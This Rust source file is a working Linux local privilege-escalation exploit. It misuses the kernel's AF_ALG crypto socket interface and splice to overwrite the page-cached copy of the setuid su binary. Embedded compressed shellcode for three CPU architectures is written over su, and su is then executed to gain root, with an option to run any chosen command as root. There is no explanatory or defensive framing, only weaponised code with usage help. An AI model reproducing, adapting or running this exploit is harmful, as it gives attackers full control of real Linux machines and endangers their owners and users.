use std::env;
use std::fs::{File, OpenOptions};
use std::io::{self, Read};
use std::os::unix::fs::OpenOptionsExt;
use std::os::unix::fs::MetadataExt;
use std::os::unix::fs::PermissionsExt;
use std::os::unix::io::{AsRawFd, RawFd};
use std::path::Path;
use std::process::{Command, Stdio};
use flate2::read::ZlibDecoder;
use std::ptr;
use std::mem;

const SOL_ALG: libc::c_int = 279;
const ALG_SET_KEY: libc::c_int = 1;
const ALG_SET_IV: libc::c_int = 2;
const ALG_SET_OP: libc::c_int = 3;
const ALG_SET_AEAD_ASSOCLEN: libc::c_int = 4;
const ALG_SET_AEAD_AUTHSIZE: libc::c_int = 5;

const PAYLOADS_ZLIB_HEX: &[(&str, &str)] = &[
    ("x86_64", "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c00111d10d3"),
    ("x86", "789cab77f57163646464800126066606102fa48185c38401014c18141860aae0aa816a40b806c80461569098000383e101c3db1bae9e6d303c1090a1af5f9c91a19f9499d7f93820b8f361e7a10ddc4089db598c11671b0038b31858"),
    ("aarch64", "78daab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd06ca5b039787e96cb8e421d47009c8bb0214126004f29980788534540cc4e686b0f59332f3f48b3318003ff61578"),
];

const EXEC_ARGV1_ZLIB_HEX: &[(&str, &str)] = &[
    ("x86_64", "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e02e5c1680601086578c0f0ff864c7e568fee1a1501c36f59d61133f9590dff67d944f0b3020082b00eaf"),
    ("x86", "789cab77f57163646464800126066606102fa48185c38401014c18141860aae0aa816a40381fc80461569098000383e101c3db1bae9e6de88e51e1303c99c51d31f36c83e1ed2cc688b30d001bf41180"),
    ("aarch64", "789cab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd04ca5b029787e96cb8e421d47009c8bbf280dbe1272390cf04c42ba4216220f915dc103600d72b1509"),
];

fn pack_cmsg(level: libc::c_int, typ: libc::c_int, data: &[u8]) -> Vec<u8> {
    unsafe {
        let len = libc::CMSG_SPACE(data.len() as u32) as usize;
        let mut b = vec![0u8; len];
        let h = b.as_mut_ptr() as *mut libc::cmsghdr;
        (*h).cmsg_level = level;
        (*h).cmsg_type = typ;
        (*h).cmsg_len = libc::CMSG_LEN(data.len() as u32) as usize;
        let data_ptr = libc::CMSG_DATA(h);
        ptr::copy_nonoverlapping(data.as_ptr(), data_ptr, data.len());
        b
    }
}

fn c(f_fd: RawFd, t: usize, c_data: &[u8]) {
    unsafe {
        let fd = libc::socket(libc::AF_ALG, libc::SOCK_SEQPACKET, 0);
        if fd < 0 {
            panic!("Socket creation failed");
        }

        let mut sa: libc::sockaddr_alg = mem::zeroed();
        sa.salg_family = libc::AF_ALG as u16;
        let typ_str = b"aead\0";
        sa.salg_type[..typ_str.len()].copy_from_slice(typ_str);
        let name_str = b"authencesn(hmac(sha256),cbc(aes))\0";
        sa.salg_name[..name_str.len()].copy_from_slice(name_str);

        if libc::bind(fd, &sa as *const _ as *const libc::sockaddr, mem::size_of_val(&sa) as u32) < 0 {
            panic!("Socket Bind failed");
        }

        let key_hex = format!("0800010000000010{}", "0".repeat(64));
        let key_bytes = hex::decode(&key_hex).unwrap();

        if libc::setsockopt(fd, SOL_ALG, ALG_SET_KEY, key_bytes.as_ptr() as *const libc::c_void, key_bytes.len() as u32) < 0 {
            panic!("Setsockopt(key) failed");
        }

        let authsize: libc::c_int = 4;
        if libc::setsockopt(fd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, &authsize as *const _ as *const libc::c_void, mem::size_of_val(&authsize) as u32) < 0 {
            panic!("Setsockopt(authsize) failed");
        }

        // Accept connection (address is null)
        let u_fd = libc::accept4(fd, ptr::null_mut(), ptr::null_mut(), 0);
        if u_fd < 0 {
            panic!("Accept failed");
        }
        libc::close(fd);

        let mut oob = Vec::new();
        oob.extend_from_slice(&pack_cmsg(SOL_ALG, ALG_SET_OP, &[0, 0, 0, 0]));
        
        let mut iv = vec![0x10];
        iv.extend(vec![0u8; 19]);
        oob.extend_from_slice(&pack_cmsg(SOL_ALG, ALG_SET_IV, &iv));
        oob.extend_from_slice(&pack_cmsg(SOL_ALG, ALG_SET_AEAD_ASSOCLEN, &[8, 0, 0, 0]));

        let mut msg_data = b"AAAA".to_vec();
        msg_data.extend_from_slice(c_data);

        let mut iov = libc::iovec {
            iov_base: msg_data.as_mut_ptr() as *mut libc::c_void,
            iov_len: msg_data.len(),
        };

        let mut msg: libc::msghdr = mem::zeroed();
        msg.msg_iov = &mut iov;
        msg.msg_iovlen = 1;
        msg.msg_control = oob.as_mut_ptr() as *mut libc::c_void;
        msg.msg_controllen = oob.len();

        if libc::sendmsg(u_fd, &msg, libc::MSG_MORE) < 0 {
            panic!("Sendmsg failed");
        }

        let mut p = [0 as libc::c_int; 2];
        if libc::pipe(p.as_mut_ptr()) < 0 {
            panic!("Pipe creation failed");
        }

        let mut offset: libc::loff_t = 0;

        if libc::splice(f_fd, &mut offset, p[1], ptr::null_mut(), (t + 4) as usize, 0) < 0 {
            panic!("Splice (File->Pipe) failed");
        }

        if libc::splice(p[0], ptr::null_mut(), u_fd, ptr::null_mut(), (t + 4) as usize, 0) < 0 {
            panic!("Splice (Pipe->Socket) failed");
        }

        let mut buf = vec![0u8; 8 + t];
        libc::read(u_fd, buf.as_mut_ptr() as *mut libc::c_void, buf.len());

        libc::close(p[0]);
        libc::close(p[1]);
        libc::close(u_fd);
    }
}

fn decompress_payload(zlib_bytes: &[u8]) -> Vec<u8> {
    let mut decoder = ZlibDecoder::new(zlib_bytes);
    let mut payload = Vec::new();
    decoder.read_to_end(&mut payload).expect("Zlib decompression failed");
    payload
}

fn resolve_su() -> Option<String> {
    if Path::new("/usr/bin/su").exists() {
        return Some("/usr/bin/su".to_string());
    }
    if let Ok(path) = env::var("PATH") {
        for dir in path.split(':') {
            let su_path = format!("{}/su", dir);
            if Path::new(&su_path).exists() {
                return Some(su_path);
            }
        }
    }
    None
}

fn backup_su_binary(src: &str, dst: &str) -> io::Result<()> {
    use std::fs;
    let meta = fs::metadata(src)?;
    let mut in_file = File::open(src)?;
    
    let mut out_file = OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .mode(0o600)
        .open(dst)?;
        
    io::copy(&mut in_file, &mut out_file)?;
    out_file.sync_all()?;
    
    let mode_mask = 0o777 | 0o4000 | 0o2000 | 0o1000;
    fs::set_permissions(dst, fs::Permissions::from_mode(meta.mode() & mode_mask))?;
    
    unsafe {
        let times = [
            libc::timespec { tv_sec: meta.atime(), tv_nsec: meta.atime_nsec() },
            libc::timespec { tv_sec: meta.mtime(), tv_nsec: meta.mtime_nsec() }
        ];
        let dst_cstr = std::ffi::CString::new(dst).unwrap();
        if libc::utimensat(libc::AT_FDCWD, dst_cstr.as_ptr(), times.as_ptr(), 0) < 0 {
            return Err(io::Error::last_os_error());
        }
    }
    
    Ok(())
}

fn main() {
    let args: Vec<String> = env::args().collect();
    let mut backup_path = None;
    let mut su_argv1 = None;
    let mut use_exec_argv1 = false;
    
    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-backup" | "--backup" => {
                if i + 1 < args.len() {
                    backup_path = Some(args[i + 1].clone());
                    i += 1;
                }
            }
            "-exec" | "--exec" => {
                if i + 1 < args.len() {
                    use_exec_argv1 = true;
                    su_argv1 = Some(args[i + 1].clone());
                    i += 1;
                }
            }
            "-h" | "--help" => {
                eprintln!("Usage of {}:", args[0]);
                eprintln!("  -backup string");
                eprintln!("        path to copy the su binary to before overwriting");
                eprintln!("  -exec string");
                eprintln!("        command to run as root; full path required");
                return;
            }
            _ => {}
        }
        i += 1;
    }

    let arch = std::env::consts::ARCH;
    
    let payload_map = if use_exec_argv1 {
        EXEC_ARGV1_ZLIB_HEX
    } else {
        PAYLOADS_ZLIB_HEX
    };

    let payload_hex = payload_map.iter().find(|&&(a, _)| a == arch).map(|&(_, p)| p)
        .unwrap_or_else(|| panic!("Unsupported architecture: {}", arch));

    let payload_zlib = hex::decode(payload_hex).unwrap();
    let mut payload = decompress_payload(&payload_zlib);
    while payload.len() % 4 != 0 {
        payload.push(0);
    }

    let su_path = resolve_su().expect("su not found");

    if let Some(ref bp) = backup_path {
        backup_su_binary(&su_path, bp).expect("Backup failed");
        println!("Backed up {} to {}", su_path, bp);
    }

    let f = File::open(&su_path).expect("Failed to open target file");
    let f_fd = f.as_raw_fd();

    println!("Overwriting page cache of {} with {} bytes", su_path, payload.len());
    let mut i = 0;
    while i < payload.len() {
        let end = std::cmp::min(i + 4, payload.len());
        c(f_fd, i, &payload[i..end]);
        if payload.len() < 10000 {
            if i % 100 == 0 {
                println!("  ... wrote {} bytes", i + 4);
            }
        } else {
            if i % 10000 == 0 {
                println!("  ... wrote {} bytes", i + 4);
            }
        }
        i += 4;
    }
    println!("  ... wrote {} bytes", payload.len());

    println!("Executing payload");
    let mut cmd = Command::new("su");
    if use_exec_argv1 {
        cmd.arg(su_argv1.unwrap());
    }
    cmd.stdin(Stdio::inherit())
       .stdout(Stdio::inherit())
       .stderr(Stdio::inherit());

    cmd.status().expect("Failed to execute payload");
}
